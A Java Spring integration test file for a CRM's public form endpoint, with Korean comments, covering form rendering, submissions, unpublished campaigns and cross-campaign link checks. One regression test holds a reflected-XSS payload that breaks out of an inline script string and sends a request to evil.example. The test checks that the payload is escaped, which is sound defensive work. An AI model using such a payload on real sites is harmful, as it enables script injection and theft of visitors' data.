package com.sanghee.glowuprizzcrm.publicform;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.cookie;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import com.sanghee.glowuprizzcrm.AbstractPublicIntegrationTest;
import com.sanghee.glowuprizzcrm.core.campaign.Campaign;
import com.sanghee.glowuprizzcrm.core.link.Channel;
import com.sanghee.glowuprizzcrm.core.link.DistributionLink;
import java.util.Map;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MvcResult;

@DisplayName("/f/{slug} 통합 테스트")
class FormControllerIntegrationTest extends AbstractPublicIntegrationTest {

    @Test
    @DisplayName("공개된 캠페인이면 등록된 HTML에 제출 스크립트가 주입돼 반환된다")
    void getForm_returnsHtmlWithInjectedScript_whenPublished() throws Exception {
        createPublishedCampaign("form-success", "<html><body><h1>가을 웨비나</h1><form></form></body></html>");

        mockMvc.perform(get("/f/form-success"))
                .andExpect(status().isOk())
                .andExpect(content().contentTypeCompatibleWith(MediaType.TEXT_HTML))
                .andExpect(content().string(org.hamcrest.Matchers.containsString("가을 웨비나")))
                .andExpect(content().string(org.hamcrest.Matchers.containsString("<script>")))
                .andExpect(cookie().exists("visitor_token"))
                .andExpect(header().string("Content-Security-Policy", org.hamcrest.Matchers.containsString("connect-src 'self'")));
    }

    // link 쿼리파라미터는 방문자가 임의로 조작 가능한 값인데, FormRenderService가 이를
    // 이스케이프 없이 인라인 <script>의 문자열 리터럴에 그대로 삽입했다. 홑따옴표로 문자열을
    // 끊고 임의 JS를 실행시키는 반사형 XSS였다 (라이브 PoC로 실제 재현 확인).
    @Test
    @DisplayName("link 쿼리파라미터에 악의적인 문자가 있어도 스크립트를 탈출하지 못한다 (XSS 방지)")
    void getForm_escapesMaliciousLinkParam_toPreventXss() throws Exception {
        createPublishedCampaign("xss-test", "<html><body><form></form></body></html>");
        String maliciousLink = "');new Image().src='https://evil.example/steal';//";

        MvcResult result = mockMvc.perform(get("/f/xss-test").param("link", maliciousLink))
                .andExpect(status().isOk())
                .andReturn();

        String body = result.getResponse().getContentAsString();
        assertThat(body).doesNotContain("');new Image()");
        assertThat(body).contains("link=%27%29");
    }

    @Test
    @DisplayName("미공개 캠페인이면 404와 CAMPAIGN_NOT_PUBLISHED를 반환한다")
    void getForm_returns404_whenNotPublished() throws Exception {
        Campaign campaign = createPublishedCampaign("form-unpublished", "<html></html>");
        campaign.unpublish();
        campaignRepository.save(campaign);

        mockMvc.perform(get("/f/form-unpublished"))
                .andExpect(status().isNotFound())
                .andExpect(jsonPath("$.code").value("CAMPAIGN_NOT_PUBLISHED"));
    }

    @Test
    @DisplayName("존재하지 않는 슬러그면 404와 CAMPAIGN_NOT_FOUND를 반환한다")
    void getForm_returns404_whenSlugNotFound() throws Exception {
        mockMvc.perform(get("/f/no-such-slug"))
                .andExpect(status().isNotFound())
                .andExpect(jsonPath("$.code").value("CAMPAIGN_NOT_FOUND"));
    }

    @Test
    @DisplayName("배포 링크 토큰과 함께 제출하면 채널 정보와 함께 신청이 저장된다")
    void submit_savesSubmission_withChannel_whenLinkTokenProvided() throws Exception {
        Campaign campaign = createPublishedCampaign("submit-with-link", "<html><body><form></form></body></html>");
        DistributionLink link = createLink(campaign, Channel.YOUTUBE);
        Map<String, Object> data = Map.of("email", "visitor@example.com", "name", "홍길동");

        mockMvc.perform(post("/f/submit-with-link/submissions")
                        .param("link", link.getLinkToken())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(data)))
                .andExpect(status().isCreated());

        assertThat(submissionRepository.findAll())
                .anySatisfy(submission -> {
                    assertThat(submission.getCampaignId()).isEqualTo(campaign.getId());
                    assertThat(submission.getDistributionLinkId()).isEqualTo(link.getId());
                    assertThat(submission.getChannel()).isEqualTo(Channel.YOUTUBE);
                    assertThat(submission.getData()).contains("visitor@example.com");
                });
    }

    @Test
    @DisplayName("링크 토큰 없이 제출해도(직접 접근) 채널 없이 신청이 저장된다")
    void submit_savesSubmission_withoutChannel_whenNoLinkToken() throws Exception {
        createPublishedCampaign("submit-direct", "<html><body><form></form></body></html>");
        Map<String, Object> data = Map.of("email", "direct@example.com");

        mockMvc.perform(post("/f/submit-direct/submissions")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(data)))
                .andExpect(status().isCreated());

        assertThat(submissionRepository.findAll())
                .anySatisfy(submission -> {
                    assertThat(submission.getDistributionLinkId()).isNull();
                    assertThat(submission.getChannel()).isNull();
                    assertThat(submission.getData()).contains("direct@example.com");
                });
    }

    @Test
    @DisplayName("존재하지 않는 슬러그로 제출하면 404를 반환한다")
    void submit_returns404_whenSlugNotFound() throws Exception {
        mockMvc.perform(post("/f/no-such-slug/submissions")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(Map.of("email", "x@x.com"))))
                .andExpect(status().isNotFound())
                .andExpect(jsonPath("$.code").value("CAMPAIGN_NOT_FOUND"));
    }

    @Test
    @DisplayName("미공개 캠페인에 제출을 시도하면 404와 CAMPAIGN_NOT_PUBLISHED를 반환한다")
    void submit_returns404_whenCampaignNotPublished() throws Exception {
        Campaign campaign = createPublishedCampaign("submit-unpublished", "<html></html>");
        campaign.unpublish();
        campaignRepository.save(campaign);

        mockMvc.perform(post("/f/submit-unpublished/submissions")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(Map.of("email", "x@x.com"))))
                .andExpect(status().isNotFound())
                .andExpect(jsonPath("$.code").value("CAMPAIGN_NOT_PUBLISHED"));
    }

    // 링크 토큰이 다른 캠페인 소속이면 성과 데이터가 오염될 수 있다 (실수든 조작이든).
    // 크로스 캠페인 검증이 없으면 이 테스트가 실패해야 정상인데, 라이브 검증 없이
    // 코드 리뷰로만 발견한 버그라 회귀 테스트로 고정해둔다.
    @Test
    @DisplayName("링크 토큰이 다른 캠페인 소속이면 404와 LINK_NOT_FOUND를 반환한다")
    void submit_returns404_whenLinkBelongsToDifferentCampaign() throws Exception {
        Campaign campaignA = createPublishedCampaign("cross-campaign-a", "<html></html>");
        Campaign campaignB = createPublishedCampaign("cross-campaign-b", "<html></html>");
        DistributionLink linkOfB = createLink(campaignB, Channel.X);

        mockMvc.perform(post("/f/cross-campaign-a/submissions")
                        .param("link", linkOfB.getLinkToken())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(Map.of("email", "x@x.com"))))
                .andExpect(status().isNotFound())
                .andExpect(jsonPath("$.code").value("LINK_NOT_FOUND"));

        assertThat(submissionRepository.findAll())
                .noneMatch(submission -> submission.getCampaignId().equals(campaignA.getId()));
    }
}
